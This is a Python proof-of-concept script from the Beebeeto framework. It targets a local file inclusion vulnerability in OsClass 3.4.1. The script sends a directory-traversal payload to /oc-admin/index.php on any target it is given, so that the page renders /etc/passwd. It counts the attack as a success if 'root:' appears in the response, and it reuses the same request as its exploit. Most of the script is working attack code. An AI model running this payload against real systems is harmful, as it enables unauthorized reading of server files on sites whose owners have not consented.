#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0083',
            'name': 'OsClass 3.4.1 /index.php 本地文件包含漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-04-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'OsClass',
            'vul_version': ['3.4.1'],
            'type': 'Local File Inclusion',
            'tag': ['OsClass系统漏洞', '/index.php漏洞', '本地文件包含漏洞', 'php'],
            'desc': '''
                    Local file inclusion vulnerability where discovered in Osclass, an
                    open source project that allows you to create a classifieds sites.
                    ''',
            'references': ['http://www.exploit-db.com/exploits/34763/'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ("/oc-admin/index.php?page=appearance&action=render&file="
                   "../../../../../../../../../../etc/passwd")
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'root:' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())